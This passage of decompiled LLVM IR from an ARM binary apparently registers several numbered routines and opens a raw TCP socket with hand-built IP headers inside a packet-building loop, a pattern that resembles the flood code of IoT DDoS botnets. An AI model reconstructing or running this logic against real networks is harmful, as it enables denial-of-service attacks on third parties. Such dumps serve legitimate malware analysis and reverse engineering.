  %v3_a6b0 = mul nuw nsw i32 %v3_a6a0, 4
  store i32 %v3_a6b0, i32* %r1.global-to-local, align 4
  %v2_a6b4 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a6b8 = inttoptr i32 %v2_a69c to i32*
  store i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32* %v2_a6b8, align 4
  %v3_a6bc = load i32, i32* @r5, align 4
  %v4_a6bc = add i32 %v3_a6bc, 4
  %v5_a6bc = inttoptr i32 %v4_a6bc to i8*
  store i8 3, i8* %v5_a6bc, align 1
  %v0_a6c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a6c0 = add i32 %v0_a6c0, 4
  store i32 %v1_a6c0, i32* %r1.global-to-local, align 4
  %v5_a6c4 = call i32 @function_143dc(i32 %v2_a6b4, i32 %v1_a6c0, i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32 3)
  %v2_a6c8 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a6c8 = zext i8 %v2_a6c8 to i32
  store i32 %v3_a6c8, i32* %r3.global-to-local, align 4
  store i32 %v5_a6c4, i32* %ip.global-to-local, align 4
  %v0_a6d0 = load i32, i32* @r5, align 4
  %v5_a6d0 = mul nuw nsw i32 %v3_a6c8, 4
  %v6_a6d0 = add i32 %v5_a6d0, %v5_a6c4
  %v7_a6d0 = inttoptr i32 %v6_a6d0 to i32*
  store i32 %v0_a6d0, i32* %v7_a6d0, align 4
  %v0_a6d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a6d4 = load i32, i32* @r7, align 4
  %v2_a6d4 = add i32 %v1_a6d4, %v0_a6d4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a6e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a6e0 = load i32, i32* @r6, align 4
  %v2_a6e0 = inttoptr i32 %v1_a6e0 to i32*
  store i32 %v0_a6e0, i32* %v2_a6e0, align 4
  %v0_a6e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v0_a6e4 to i8
  %v2_a6e4 = load i32, i32* @r4, align 4
  %v3_a6e4 = inttoptr i32 %v2_a6e4 to i8*
  store i8 %v1_a6e4, i8* %v3_a6e4, align 1
  %v2_a6e8 = call i32 @function_14294(i32 %v1_a6d4, i32 8)
  %v2_a6ec = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a6ec = zext i8 %v2_a6ec to i32
  store i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6e8, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_a6fc = mul nuw nsw i32 %v3_a6ec, 4
  store i32 %v3_a6fc, i32* %r1.global-to-local, align 4
  %v2_a700 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a704 = inttoptr i32 %v2_a6e8 to i32*
  store i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32* %v2_a704, align 4
  %v3_a708 = load i32, i32* @r5, align 4
  %v4_a708 = add i32 %v3_a708, 4
  %v5_a708 = inttoptr i32 %v4_a708 to i8*
  store i8 4, i8* %v5_a708, align 1
  %v0_a70c = load i32, i32* %r1.global-to-local, align 4
  %v1_a70c = add i32 %v0_a70c, 4
  store i32 %v1_a70c, i32* %r1.global-to-local, align 4
  %v5_a710 = call i32 @function_143dc(i32 %v2_a700, i32 %v1_a70c, i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32 4)
  %v2_a714 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a714 = zext i8 %v2_a714 to i32
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  store i32 %v5_a710, i32* %ip.global-to-local, align 4
  %v0_a71c = load i32, i32* @r5, align 4
  %v5_a71c = mul nuw nsw i32 %v3_a714, 4
  %v6_a71c = add i32 %v5_a71c, %v5_a710
  %v7_a71c = inttoptr i32 %v6_a71c to i32*
  store i32 %v0_a71c, i32* %v7_a71c, align 4
  %v0_a720 = load i32, i32* %r3.global-to-local, align 4
  %v1_a720 = load i32, i32* @r7, align 4
  %v2_a720 = add i32 %v1_a720, %v0_a720
  store i32 %v2_a720, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a72c = load i32, i32* %ip.global-to-local, align 4
  %v1_a72c = load i32, i32* @r6, align 4
  %v2_a72c = inttoptr i32 %v1_a72c to i32*
  store i32 %v0_a72c, i32* %v2_a72c, align 4
  %v0_a730 = load i32, i32* %r2.global-to-local, align 4
  %v1_a730 = trunc i32 %v0_a730 to i8
  %v2_a730 = load i32, i32* @r4, align 4
  %v3_a730 = inttoptr i32 %v2_a730 to i8*
  store i8 %v1_a730, i8* %v3_a730, align 1
  %v2_a734 = call i32 @function_14294(i32 %v1_a720, i32 8)
  %v2_a738 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a738 = zext i8 %v2_a738 to i32
  store i32 ptrtoint (i32* @global_var_b728.78 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a734, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_a748 = mul nuw nsw i32 %v3_a738, 4
  store i32 %v3_a748, i32* %r1.global-to-local, align 4
  %v2_a74c = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a750 = inttoptr i32 %v2_a734 to i32*
  store i32 ptrtoint (i32* @global_var_b728.78 to i32), i32* %v2_a750, align 4
  %v3_a754 = load i32, i32* @r5, align 4
  %v4_a754 = add i32 %v3_a754, 4
  %v5_a754 = inttoptr i32 %v4_a754 to i8*
  store i8 5, i8* %v5_a754, align 1
  %v0_a758 = load i32, i32* %r1.global-to-local, align 4
  %v1_a758 = add i32 %v0_a758, 4
  store i32 %v1_a758, i32* %r1.global-to-local, align 4
  %v5_a75c = call i32 @function_143dc(i32 %v2_a74c, i32 %v1_a758, i32 ptrtoint (i32* @global_var_b728.78 to i32), i32 5)
  %v2_a760 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a760 = zext i8 %v2_a760 to i32
  store i32 %v3_a760, i32* %r3.global-to-local, align 4
  store i32 %v5_a75c, i32* %ip.global-to-local, align 4
  %v0_a768 = load i32, i32* @r5, align 4
  %v5_a768 = mul nuw nsw i32 %v3_a760, 4
  %v6_a768 = add i32 %v5_a768, %v5_a75c
  %v7_a768 = inttoptr i32 %v6_a768 to i32*
  store i32 %v0_a768, i32* %v7_a768, align 4
  %v0_a76c = load i32, i32* %r3.global-to-local, align 4
  %v1_a76c = load i32, i32* @r7, align 4
  %v2_a76c = add i32 %v1_a76c, %v0_a76c
  store i32 %v2_a76c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a778 = load i32, i32* %ip.global-to-local, align 4
  %v1_a778 = load i32, i32* @r6, align 4
  %v2_a778 = inttoptr i32 %v1_a778 to i32*
  store i32 %v0_a778, i32* %v2_a778, align 4
  %v0_a77c = load i32, i32* %r2.global-to-local, align 4
  %v1_a77c = trunc i32 %v0_a77c to i8
  %v2_a77c = load i32, i32* @r4, align 4
  %v3_a77c = inttoptr i32 %v2_a77c to i8*
  store i8 %v1_a77c, i8* %v3_a77c, align 1
  %v2_a780 = call i32 @function_14294(i32 %v1_a76c, i32 8)
  %v2_a784 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a784 = zext i8 %v2_a784 to i32
  store i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a780, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_a794 = mul nuw nsw i32 %v3_a784, 4
  store i32 %v3_a794, i32* %r1.global-to-local, align 4
  %v2_a798 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a79c = inttoptr i32 %v2_a780 to i32*
  store i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32* %v2_a79c, align 4
  %v3_a7a0 = load i32, i32* @r5, align 4
  %v4_a7a0 = add i32 %v3_a7a0, 4
  %v5_a7a0 = inttoptr i32 %v4_a7a0 to i8*
  store i8 6, i8* %v5_a7a0, align 1
  %v0_a7a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a7a4 = add i32 %v0_a7a4, 4
  store i32 %v1_a7a4, i32* %r1.global-to-local, align 4
  %v5_a7a8 = call i32 @function_143dc(i32 %v2_a798, i32 %v1_a7a4, i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32 6)
  %v2_a7ac = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a7ac = zext i8 %v2_a7ac to i32
  store i32 %v3_a7ac, i32* %r3.global-to-local, align 4
  store i32 %v5_a7a8, i32* %ip.global-to-local, align 4
  %v0_a7b4 = load i32, i32* @r5, align 4
  %v5_a7b4 = mul nuw nsw i32 %v3_a7ac, 4
  %v6_a7b4 = add i32 %v5_a7b4, %v5_a7a8
  %v7_a7b4 = inttoptr i32 %v6_a7b4 to i32*
  store i32 %v0_a7b4, i32* %v7_a7b4, align 4
  %v0_a7b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7b8 = load i32, i32* @r7, align 4
  %v2_a7b8 = add i32 %v1_a7b8, %v0_a7b8
  store i32 %v2_a7b8, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a7c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_a7c4 = load i32, i32* @r6, align 4
  %v2_a7c4 = inttoptr i32 %v1_a7c4 to i32*
  store i32 %v0_a7c4, i32* %v2_a7c4, align 4
  %v0_a7c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a7c8 = trunc i32 %v0_a7c8 to i8
  %v2_a7c8 = load i32, i32* @r4, align 4
  %v3_a7c8 = inttoptr i32 %v2_a7c8 to i8*
  store i8 %v1_a7c8, i8* %v3_a7c8, align 1
  %v2_a7cc = call i32 @function_14294(i32 %v1_a7b8, i32 8)
  %v2_a7d0 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a7d0 = zext i8 %v2_a7d0 to i32
  store i32 ptrtoint (i32* @global_var_a890.82 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a7cc, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_a7e0 = mul nuw nsw i32 %v3_a7d0, 4
  store i32 %v3_a7e0, i32* %r1.global-to-local, align 4
  %v2_a7e4 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a7e8 = inttoptr i32 %v2_a7cc to i32*
  store i32 ptrtoint (i32* @global_var_a890.82 to i32), i32* %v2_a7e8, align 4
  %v3_a7ec = load i32, i32* @r5, align 4
  %v4_a7ec = add i32 %v3_a7ec, 4
  %v5_a7ec = inttoptr i32 %v4_a7ec to i8*
  store i8 7, i8* %v5_a7ec, align 1
  %v0_a7f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a7f0 = add i32 %v0_a7f0, 4
  store i32 %v1_a7f0, i32* %r1.global-to-local, align 4
  %v5_a7f4 = call i32 @function_143dc(i32 %v2_a7e4, i32 %v1_a7f0, i32 ptrtoint (i32* @global_var_a890.82 to i32), i32 7)
  %v2_a7f8 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a7f8 = zext i8 %v2_a7f8 to i32
  store i32 %v3_a7f8, i32* %r3.global-to-local, align 4
  store i32 %v5_a7f4, i32* %ip.global-to-local, align 4
  %v0_a800 = load i32, i32* @r5, align 4
  %v5_a800 = mul nuw nsw i32 %v3_a7f8, 4
  %v6_a800 = add i32 %v5_a800, %v5_a7f4
  %v7_a800 = inttoptr i32 %v6_a800 to i32*
  store i32 %v0_a800, i32* %v7_a800, align 4
  %v0_a804 = load i32, i32* %r3.global-to-local, align 4
  %v1_a804 = load i32, i32* @r7, align 4
  %v2_a804 = add i32 %v1_a804, %v0_a804
  store i32 %v2_a804, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v1_a810 = trunc i32 %v2_a804 to i8
  %v2_a810 = load i32, i32* @r4, align 4
  %v3_a810 = inttoptr i32 %v2_a810 to i8*
  store i8 %v1_a810, i8* %v3_a810, align 1
  %v0_a814 = load i32, i32* %ip.global-to-local, align 4
  %v1_a814 = load i32, i32* @r6, align 4
  %v2_a814 = inttoptr i32 %v1_a814 to i32*
  store i32 %v0_a814, i32* %v2_a814, align 4
  %v2_a818 = call i32 @function_14294(i32 %v1_a804, i32 8)
  %v2_a81c = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a81c = zext i8 %v2_a81c to i32
  store i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a818, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_a82c = mul nuw nsw i32 %v3_a81c, 4
  store i32 %v3_a82c, i32* %r1.global-to-local, align 4
  %v2_a830 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a834 = inttoptr i32 %v2_a818 to i32*
  store i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32* %v2_a834, align 4
  %v3_a838 = load i32, i32* @r5, align 4
  %v4_a838 = add i32 %v3_a838, 4
  %v5_a838 = inttoptr i32 %v4_a838 to i8*
  store i8 10, i8* %v5_a838, align 1
  %v0_a83c = load i32, i32* %r1.global-to-local, align 4
  %v1_a83c = add i32 %v0_a83c, 4
  store i32 %v1_a83c, i32* %r1.global-to-local, align 4
  %v5_a840 = call i32 @function_143dc(i32 %v2_a830, i32 %v1_a83c, i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32 10)
  %v2_a844 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a844 = zext i8 %v2_a844 to i32
  store i32 %v3_a844, i32* %r3.global-to-local, align 4
  %v1_a848 = load i32, i32* @r6, align 4
  %v2_a848 = inttoptr i32 %v1_a848 to i32*
  store i32 %v5_a840, i32* %v2_a848, align 4
  %v0_a84c = load i32, i32* @r5, align 4
  %v2_a84c = load i32, i32* %r3.global-to-local, align 4
  %v5_a84c = mul i32 %v2_a84c, 4
  %v6_a84c = add i32 %v5_a84c, %v5_a840
  %v7_a84c = inttoptr i32 %v6_a84c to i32*
  store i32 %v0_a84c, i32* %v7_a84c, align 4
  %v0_a850 = load i32, i32* %r3.global-to-local, align 4
  %v1_a850 = load i32, i32* @r7, align 4
  %v2_a850 = add i32 %v1_a850, %v0_a850
  store i32 %v2_a850, i32* %r2.global-to-local, align 4
  %v1_a858 = trunc i32 %v2_a850 to i8
  %v2_a858 = load i32, i32* @r4, align 4
  %v3_a858 = inttoptr i32 %v2_a858 to i8*
  store i8 %v1_a858, i8* %v3_a858, align 1
  %v2_a85c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_a85c, i32* @r4, align 4
  store i32 %v6_a558, i32* @r5, align 4
  store i32 %v9_a558, i32* @r6, align 4
  store i32 %v12_a558, i32* @r7, align 4
  ret i32 %v1_a850

; uselistorder directives
  uselistorder i32 %v1_a850, { 1, 0 }
  uselistorder i32 %v1_a804, { 1, 0 }
  uselistorder i32 %v1_a7b8, { 1, 0 }
  uselistorder i32 %v1_a76c, { 1, 0 }
  uselistorder i32 %v1_a720, { 1, 0 }
  uselistorder i32 %v1_a6d4, { 1, 0 }
  uselistorder i32 %v1_a688, { 1, 0 }
  uselistorder i32 %v1_a63c, { 1, 0 }
  uselistorder i32 %v1_a5f0, { 1, 0 }
  uselistorder i8 7, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32* @global_var_1ec00.57, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i8* bitcast (i8** @global_var_1ebfc.55 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_a890(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a890:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_a890 = load i32, i32* @r4, align 4
  %v15_a890 = load i32, i32* @r8, align 4
  %v21_a890 = load i32, i32* @sl, align 4
  %v1_a894 = urem i32 %arg1, 256
  store i32 %v1_a894, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_a894, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_a8ac = urem i32 %arg3, 256
  store i32 %v1_a8ac, i32* @r4, align 4
  %v2_a8b0 = call i32 @function_14294(i32 %v1_a894, i32 4)
  %v0_a8b4 = load i32, i32* @r5, align 4
  store i32 %v0_a8b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8c4 = load i32, i32* @r4, align 4
  store i32 %v0_a8c4, i32* %r0.global-to-local, align 4
  %v5_a8c8 = inttoptr i32 %v0_a8b4 to i32*
  %v6_a8c8 = call i32 @function_a4e8(i32 %v0_a8c4, i32* %v5_a8c8, i32 2, i32 0)
  %v1_a8d4 = urem i32 %v6_a8c8, 256
  store i32 %v1_a8d4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  %v0_a8e4 = load i32, i32* @r4, align 4
  store i32 %v0_a8e4, i32* %r0.global-to-local, align 4
  %v5_a8e8 = trunc i32 %v6_a8c8 to i8
  %v6_a8ec = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8ec = call i32 @function_a4e8(i32 %v0_a8e4, i32* %v6_a8ec, i32 3, i32 65535)
  %v0_a8f0 = load i32, i32* @r5, align 4
  store i32 %v0_a8f0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8ec, i32* @r7, align 4
  %v0_a900 = load i32, i32* @r4, align 4
  store i32 %v0_a900, i32* %r0.global-to-local, align 4
  %v4_a904 = inttoptr i32 %v0_a8f0 to i32*
  %v5_a904 = call i32 @function_a4e8(i32 %v0_a900, i32* %v4_a904, i32 4, i32 64)
  %v1_a90c = urem i32 %v5_a904, 256
  store i32 %v1_a90c, i32* %ip.global-to-local, align 4
  %v0_a910 = load i32, i32* @r5, align 4
  store i32 %v0_a910, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a91c = load i32, i32* @r4, align 4
  store i32 %v0_a91c, i32* %r0.global-to-local, align 4
  %v5_a920 = trunc i32 %v5_a904 to i8
  %v6_a924 = inttoptr i32 %v0_a910 to i32*
  %v7_a924 = call i32 @function_a4e8(i32 %v0_a91c, i32* %v6_a924, i32 5, i32 1)
  %v1_a930 = urem i32 %v7_a924, 256
  store i32 %v1_a930, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  %v0_a940 = load i32, i32* @r4, align 4
  store i32 %v0_a940, i32* %r0.global-to-local, align 4
  %v5_a948 = inttoptr i32 %v0_a93c to i32*
  %v6_a948 = call i32 @function_a4e8(i32 %v0_a940, i32* %v5_a948, i32 6, i32 65535)
  %v0_a950 = load i32, i32* @r5, align 4
  store i32 %v0_a950, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a948, i32* @sl, align 4
  %v0_a960 = load i32, i32* @r4, align 4
  store i32 %v0_a960, i32* %r0.global-to-local, align 4
  %v4_a964 = inttoptr i32 %v0_a950 to i32*
  %v5_a964 = call i32 @function_a4e8(i32 %v0_a960, i32* %v4_a964, i32 7, i32 65535)
  %v0_a968 = load i32, i32* @r5, align 4
  store i32 %v0_a968, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a964, i32* @r8, align 4
  %v0_a978 = load i32, i32* @r4, align 4
  store i32 %v0_a978, i32* %r0.global-to-local, align 4
  %v4_a97c = inttoptr i32 %v0_a968 to i32*
  %v5_a97c = call i32 @function_a4e8(i32 %v0_a978, i32* %v4_a97c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a98c = load i32, i32* @r5, align 4
  store i32 %v0_a98c, i32* %r1.global-to-local, align 4
  %v0_a990 = load i32, i32* @r4, align 4
  store i32 %v0_a990, i32* %r0.global-to-local, align 4
  %v4_a994 = inttoptr i32 %v0_a98c to i32*
  %v5_a994 = call i32 @function_a4e8(i32 %v0_a990, i32* %v4_a994, i32 1, i32 1)
  %v1_a99c = urem i32 %v5_a994, 256
  store i32 %v1_a99c, i32* %ip.global-to-local, align 4
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r4, align 4
  store i32 %v0_a9ac, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @function_a4e8(i32 %v0_a9ac, i32* %v5_a9b4, i32 19, i32 0)
  %v0_a9bc = load i32, i32* @r5, align 4
  store i32 %v0_a9bc, i32* %r1.global-to-local, align 4
  %v2_a9c0 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_a9c0, i32* %r3.global-to-local, align 4
  store i32 %v6_a9b4, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a9cc = load i32, i32* @r4, align 4
  store i32 %v0_a9cc, i32* %r0.global-to-local, align 4
  %v4_a9d0 = inttoptr i32 %v0_a9bc to i32*
  %v5_a9d0 = call i32 @function_a4e8(i32 %v0_a9cc, i32* %v4_a9d0, i32 25, i32 %v2_a9c0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a9e4 = call i32 @function_13f90(i32 2, i32 3, i32 6)
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  %v7_a9e8 = icmp eq i32 %v3_a9e4, -1
  store i1 %v7_a9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9e8, label %dec_label_pc_aecc, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_a890
  store i32 1, i32* %stack_var_-40, align 4
  %v6_a9fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_a9fc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_aa10 = call i32 @function_13f60(i32 %v3_a9e4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_aa10, i32* %r0.global-to-local, align 4
  %v7_aa14 = icmp eq i32 %v6_aa10, -1
  store i1 %v7_aa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa14, label %dec_label_pc_aec4, label %dec_label_pc_aa1c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_a9f4
  %v0_aa1c = load i32, i32* @sl, align 4
  %v3_aa1c = mul i32 %v0_aa1c, 65536
  store i32 %v3_aa1c, i32* %sl.global-to-local, align 4
  %v0_aa20 = load i32, i32* @r8, align 4
  %v3_aa20 = mul i32 %v0_aa20, 65536
  store i32 %v3_aa20, i32* %r8.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r7, align 4
  %v3_aa28 = mul i32 %v0_aa28, 65536
  %v0_aa2c = load i32, i32* @r6, align 4
  %v1_aa2c = urem i32 %v0_aa2c, 256
  store i32 0, i32* %stack_var_-40, align 4
  %v3_aa34 = urem i32 %v0_aa28, 65536
  store i32 %v3_aa34, i32* %r2.global-to-local, align 4
  %v3_aa38 = urem i32 %v0_aa1c, 65536
  store i32 %v3_aa38, i32* %r3.global-to-local, align 4
  %v3_aa3c = urem i32 %v0_aa20, 65536
  store i32 %v3_aa3c, i32* %r1.global-to-local, align 4
  %v0_aa40 = load i32, i32* @fp, align 4
  %v2_aa40 = icmp eq i32 %v0_aa40, 0
  store i1 %v2_aa40, i1* %cpsr_z.global-to-local, align 1
  %tmp88 = icmp slt i32 %v0_aa40, 1
  br i1 %tmp88, label %dec_label_pc_afec, label %dec_label_pc_aa60

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa1c
  %v3_aa64 = mul i32 %v5_a97c, 65536
  %v0_aa28.not = or i32 %v0_aa28, -65536
  %v1_aa6c = xor i32 %v0_aa28.not, 65535
  %v1_aa74 = add i32 %v3_aa64, 4325376
  %v1_aa78 = urem i32 %v0_aa1c, 256
  %v3_aa80 = udiv i32 %v1_aa74, 256
  %v1_aa84 = add i32 %v3_aa64, 524288
  %v1_aa8c = add i32 %v3_aa64, 1835008
  %v1_aa90 = urem i32 %v0_aa20, 256
  %v1_aa94 = and i32 %v3_aa80, 65280
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  %v3_aa9c = udiv i32 %v1_aa8c, 256
  %tmp89 = mul nsw i32 %v1_aa6c, 256
  %v1_aab4 = and i32 %v3_aa9c, 65280
  store i32 %v1_aab4, i32* %ip.global-to-local, align 4
  %v1_aab8 = and i32 %tmp89, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_aab8, i32* @lr, align 4
  %tmp91 = udiv i32 %v1_aa6c, 256
  %v4_aaa4 = sdiv i32 %v1_aa74, 16777216
  %v5_aad4 = trunc i32 %tmp91 to i8
  %v3_aae0 = mul nuw nsw i32 %v1_aa78, 256
  %v3_aae8 = ashr i32 %v1_aa74, 31
  %v3_aaec = mul nuw nsw i32 %v1_aa90, 256
  store i32 %v3_aaec, i32* @r5, align 4
  %tmp92 = udiv i32 %v0_aa1c, 256
  %v4_aaf0 = urem i32 %tmp92, 256
  %v5_aaf0 = or i32 %v4_aaf0, %v3_aae0
  store i32 %v5_aaf0, i32* @r7, align 4
  %v3_aaf4 = udiv i32 %v1_aa84, 256
  %tmp93 = udiv i32 %v0_aa20, 256
  %v4_aaf8 = urem i32 %tmp93, 256
  %v5_aaf8 = or i32 %v4_aaf8, %v3_aaec
  store i32 %v5_aaf8, i32* %sl.global-to-local, align 4
  %v5_aafc = trunc i32 %v3_aae8 to i8
  %v3_ab04 = sdiv i32 %v3_aa28, 16777216
  %v7_ab04 = sdiv i32 %v1_aa8c, 16777216
  %v1_ab08 = and i32 %v3_aaf4, 65280
  store i32 %v1_ab08, i32* @r6, align 4
  %v3_ab0c = ashr i32 %v3_aa28, 31
  %v3_ab10 = ashr i32 %v1_aa8c, 31
  %v3_ab14 = udiv i32 %v1_aa6c, 65536
  %v4_ab18 = udiv i32 %v1_aa84, 16777216
  %v5_ab18 = or i32 %v4_ab18, %v1_ab08
  store i32 %v5_ab18, i32* %r8.global-to-local, align 4
  store i32 %v1_aa78, i32* %r1.global-to-local, align 4
  store i32 %v1_aa90, i32* %r2.global-to-local, align 4
  %v3_ab3037 = udiv i32 %v1_ab08, 256
  store i32 %v3_ab3037, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ab90 = sext i8 %v5_a920 to i32
  %v2_ac90 = icmp eq i32 %v1_aa2c, 0
  %sext16 = mul i32 %v0_aa1c, 16777216
  %v4_aca4 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_aa84, 256
  %v4_acb8 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_aa20, 16777216
  %v4_acc0 = sdiv i32 %sext18, 16777216
  %v1_acc8 = trunc i32 %v4_acb8 to i8
  br label %dec_label_pc_ab44

dec_label_pc_ab44:                                ; preds = %bb105, %dec_label_pc_aa60
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab50 = call i32 @function_14294(i32 1510, i32 4)
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  store i32 %v2_a8b0, i32* %r1.global-to-local, align 4
  %v3_ab58 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ab58, i32* %r3.global-to-local, align 4
  %v2_ab5c = load i32, i32* @r4, align 4
